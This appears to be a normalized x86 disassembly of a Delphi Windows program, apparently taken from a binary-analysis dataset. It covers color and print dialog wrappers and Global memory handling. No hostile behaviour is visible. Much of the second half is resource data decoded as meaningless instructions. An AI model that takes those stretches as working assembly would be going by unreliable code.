lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_426460
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_4264fe
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404268
mov eax [ ebp - 0x10 ]
call sub_407fd0
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_404144
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404268
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_4147e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426505
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f80
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_42651f
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_426460
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_41bfbc
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_426048
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_426394
pop ecx
sub_4265f0
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_424884
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_424018
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_40847c
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_40847c
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_40847c
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_4266e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_4084e0
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_4084e0
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_4084b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_4266f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_426760
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_424884
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_4240c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426767
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_426770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_4267f2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028b8
sub_42681c
push ebx
push esi
push edi
add esp 0xffffffb8
mov edi eax
lea esi [ esp + 0x4 ]
mov eax esi
xor ecx ecx
mov edx 0x42
call sub_402c40
mov [ esi ] 0x42
mov eax [ rw-data ]
mov [ esi + 0x22 ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_4265f0
mov eax [ esp ]
call sub_426770
mov [ esi + 0x8 ] eax
xor eax eax
mov al [ edi + 0x63 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x3000
mov [ esi + 0x14 ] eax
cmp [ edi + 0x60 ] 0x0
je r-xdata
test [ edi + 0x61 ] 0x1
jne r-xdata
add [ esi + 0x14 ] 0x10
test [ edi + 0x61 ] 0x2
jne r-xdata
add [ esi + 0x14 ] 0x100000
test [ edi + 0x61 ] 0x4
jne r-xdata
add [ esi + 0x14 ] 0x8
test [ edi + 0x61 ] 0x20
je r-xdata
add [ esi + 0x14 ] 0x4
cmp [ edi + 0x62 ] 0x0
je r-xdata
add [ esi + 0x14 ] 0x80000
test [ edi + 0x61 ] 0x10
je r-xdata
add [ esi + 0x14 ] 0x20
test [ edi + 0x61 ] 0x8
jne r-xdata
add [ esi + 0x14 ] 0x800
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
add [ esi + 0x14 ] 0x80
mov ax [ edi + 0x58 ]
mov [ esi + 0x18 ] ax
mov ax [ edi + 0x5c ]
mov [ esi + 0x1a ] ax
mov ax [ edi + 0x64 ]
mov [ esi + 0x1c ] ax
mov ax [ edi + 0x68 ]
mov [ esi + 0x1e ] ax
mov [ esi + 0x2a ] sub_426048
mov [ esi + 0x2e ] sub_426048
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov ecx esi
mov edx PrintDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ esi + 0x14 ] 0x4000
mov [ esi + 0x32 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4266f4
test [ esi + 0x14 ] 0x10
setne al
mov [ edi + 0x60 ] al
test [ esi + 0x14 ] 0x20
setne al
mov [ edi + 0x62 ] al
mov eax [ esi + 0x14 ]
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
test al 0x2
je r-xdata
mov [ edi + 0x63 ] 0x1
jmp r-xdata
mov eax ebx
add esp 0x48
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
mov [ edi + 0x63 ] 0x0
mov [ edi + 0x63 ] 0x2
jmp r-xdata
movzx eax [ esi + 0x18 ]
mov [ edi + 0x58 ] eax
movzx eax [ esi + 0x1a ]
mov [ edi + 0x5c ] eax
mov ax [ esi + 0x20 ]
cmp ax 0x1
jne r-xdata
movzx edx ax
mov eax edi
call sub_426808
jmp r-xdata
call sub_424884
call sub_424308
mov edx eax
mov eax edi
call sub_426808
jmp r-xdata
sub_426a68
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408af0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_426b03
add [ edi ] cl
add [ eax ] al
add [ eax - 0x5fffb9c9 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x40b00046 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7fffb9c9 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x41b00046 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x37ffb9c9 ] ah
inc eax
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x40700046 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x4c004637 ] bl
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x3fc40046 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffb9c9 ] dl
inc eax
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x3fe80046 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c004637 ] cl
inc edx
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x46 ] dl
add al ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x37 ] dl
inc esi
add [ eax + 0x4641 ] bl
add [ eax ] al
add [ edi + esi + 0x46 ] cl
add al bl
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x37 ] cl
inc esi
add [ eax ] ch
inc eax
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_426c0e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c15
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_4049d8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_426c18
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d30
call sub_426a68
mov eax [ r-xdata ]
call sub_413154
mov eax [ r-xdata ]
call sub_4131f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
sub_426c5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_42aed9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
insb
inc edx
add ah bl
insb
inc edx
add [ eax + eax ] al
add ah ah
and [ ecx ] eax
pushad
fwait
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add al ch
pop [ edx ]
mov al [ 0x6800413f ]
xchg edi eax
inc ecx
add [ esi + edi - 0x67bfffbf ] bh
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ eax - 0x68 ] dl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0x67ffbe65 ] al
pop [ edx ]
add [ eax ] eax
out dx eax
[ eax - 0x6f ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x6ce89072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x426ca472
add al ah
and al [ ecx ]
add eax 0x78450800
je r-xdata
dec ecx
outsb
je r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + eax * 2 + 0x2ee40044 ] cl
inc esp
add [ edi + esi * 8 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
outsb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x6eb00042 ] al
inc edx
add [ edx + eax ] ah
add [ eax ] al
xor [ ebx - 0x649fffbd ] al
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ edi + edi * 8 + 0x43 ] al
insb
jae r-xdata
inc ebx
add [ esi + edi - 0x235fffbf ] bh
inc ebx
add [ eax + esi * 4 - 0x1c3fffbd ] bl
inc ebx
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax + 0x6c00419b ] al
xchg ecx eax
inc edx
add al bh
sub [ eax + eax - 0x40 ] eax
xchg edi eax
inc edx
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add [ esp + 0x21ac0044 ] dl
inc esp
add [ eax - 0x52 ] bl
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add [ eax - 0x22 ] dh
inc ebx
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0xbaa00043
inc ebx
add [ ebp + edi * 4 - 0x439fffbd ] dh
inc ebx
add al ah
std
inc ebx
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
add [ edx + 0x1db80044 ] bh
inc esp
add [ eax + 0x2c004422 ] ah
xchg esi eax
inc edx
add ah cl
0xf86c0043 0x43
popad
insb
sub al 0x10
inc ecx
add [ eax ] bh
add [ eax ] al
inc [ eax - 0x6f ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x426db872
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add bh bh
and [ ecx + 0x10042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
jmp [ eax ]
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
xchg ecx eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
sub_42870c
pop esp
cmp al 0x43
add [ ebp + esi * 8 + 0x43 ] dl
add [ eax - 0x52 ] dh
inc edx
add [ ecx + edi * 8 ] al
inc ebx
add [ eax ] cl
stc
inc ebx
add al dh
inc ebx
add [ eax ] al
inc ebx
add al ah
and eax [ eax + eax - 0x50 ]
add [ eax + eax - 0x4c ] eax
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] edx
add [ edi + ebp ] dl
inc ebx
add [ eax ] ch
cmp [ ebx ] eax
[ ebx ] eax
sbb [ edi + 0x43 ] al
add [ eax ] bh
cmp al 0x43
add [ eax ] cl
xor [ ebx ] al
or al 0x47
inc ebx
add al bl
cmp al [ ebx ]
in al 0x39
inc ebx
add al al
scasb [ edi ]
inc edx
add [ eax ] ch
inc ebp
inc ebx
add al bh
cmp eax [ ebx ]
and al 0xb1
inc edx
add [ ecx ] cl
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
imul eax [ edx ] 0x269ff00
add bh bh
add [ eax ] eax
outsd
js r-xdata
or al 0x41
jne r-xdata
outsd
js r-xdata
add [ eax ] al
str [ eax ]
outsd
inc esp
jb r-xdata
add [ eax ] al
xchg [ edx ] al
cld
test [ edx ] eax
cmp al [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
push cs
outsd
inc ebx
outsd
insd
jo r-xdata
xor eax 0x205c0044
inc esp
add [ ebx + 0x44 ] cl
add ah cl
cmp al [ ebx ]
mov al [ 0xffffffffcc00432f ]
das
inc ebx
add al ah
cmp al [ ebx ]
les ebp [ esi ]
inc ebx
add [ eax ] cl
cmp al [ ebx ]
adc al 0x3a
inc ebx
add [ eax + 0x5000433a ] ah
jae r-xdata
inc esp
add [ eax - 0x4bffbbff ] dh
insb
outsd
jb r-xdata
shl [ edi + eax * 4 + 0x9070042 ] 0x54
inc ebx
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
dec eax
test [ edx ] al
cwde
add al [ eax ]
[ eax - 0x4b ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ edi ] cl
jo r-xdata
push 0x6100436e
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ eax ] dl
add [ 0x6c797453 ] al
je r-xdata
or al 0x0
or al 0x41
jne r-xdata
add [ eax ] al
je r-xdata
je r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add [ esi ] cl
dec esi
outsd
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ esi ] cl
outsd
ja r-xdata
add [ eax ] al
add [ eax ] 0x0
outsd
insb
outsd
jb r-xdata
insb
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + 0x65 ] eax
jbe r-xdata
insb
add eax 0x6c797453
stosb [ edi ]
inc ecx
add [ eax - 0x50 ] bl
inc edx
add [ eax + 0x10042b4 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] cl
or eax 0x65441100
popa
jne r-xdata
cmp al 0xaa
inc ecx
add [ edx + eax - 0x4b770100 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
insb
outsd
jb r-xdata
[ ecx + 0x2 ]
add [ eax ] al
adc [ eax ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop ss
add [ 0x6f6c6f43 ] al
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
jmp eax
add [ eax ] al
stosb [ edi ]
inc ecx
add [ eax - 0x6300fffe ] ah
mov ah 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
outsd
inc ebx
add [ eax + eax ] dh
push 0xc0ff0000
mov esp 0xbcd00043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001c ] al
jb r-xdata
push ds
add [ esi ] cl
push eax
popad
jb r-xdata
adc [ eax ] al
cld
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a001d ] al
je r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
fsubr [ esi + 0x680041 ]
add bh bh
sar [ ebx + eax * 2 + 0x43bcd000 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
add al 0x46
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0xcff0001 ] ah
and eax 0x25300044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050019 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40100074
xor eax [ esp + edi + 0x10 ]
inc eax
add [ eax ] dl
add al [ eax ]
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or eax 0x706f7244
inc esp
outsd
ja r-xdata
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] ah
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax + 0x10043bd ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
outsb
je r-xdata
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc ebx
outsd
jne r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
push 0xe8004425
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
outsb
je r-xdata
in al dx
mov edx 0xdc600043
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
adc [ ecx ] al
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
sub al 0x10
inc ecx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
je r-xdata
[ eax + eax ]
je r-xdata
sub al 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9418ca7
add [ eax ] al
inc [ ecx ]
push ebp
jo r-xdata
adc [ eax ] al
adc [ eax ] al
0x40ff0000 0x43bd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
inc [ eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
and [ eax ] eax
or dl [ eax + 0x61 ]
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
clc
mov esp 0x10043
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
push eax
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] ecx
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002b ] al
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ ecx ] al
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb ah 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002a ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
push cs
dec edi
adc [ eax ] al
push edi
add [ eax ] al
and eax 0x25e80044
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
and [ eax ] al
or edx [ eax + 0x61 ]
adc [ eax ] al
test eax 0x3cff0001
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
cdq
add [ eax ] al
[ edi * 4 - 0x431bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
sub al 0x10
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060033 ] al
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
pushad
jo r-xdata
add [ eax ] al
js r-xdata
add [ ecx ] 0x0
add [ eax ] al
lodsb [ esi ]
inc esp
add [ eax + eax ] bh
inc [ ebx + edi * 4 + 0x10043 ]
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
and eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and eax 0x61540800
bound ecx [ edi + 0x72 ]
jb r-xdata
insd
inc ebx
add [ eax + 0x25 ] ch
inc esp
add al ch
jns r-xdata
je r-xdata
dec ebx
jns r-xdata
sub al 0x10
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070032 ] al
outsb
inc ebp
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
jno r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
dec edi
jbe r-xdata
sub al 0x10
inc ecx
add [ eax ] ch
push eax
outsd
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0039 ] al
outsb
jo r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
jo r-xdata
inc esp
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
dec edi
jb r-xdata
add al [ eax ]
[ eax ]
jo r-xdata
inc ebp
in al dx
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
adc [ ecx ] al
and [ edx ] al
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
dec edi
outsb
push ebx
insb
arpl [ gs : eax + 0x74 ] si
inc ebx
add [ eax ] al
add [ eax ] eax
jae r-xdata
add al bl
add [ eax ] eax
add [ ecx ] al
add bh bh
add [ ecx ] al
hlt
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
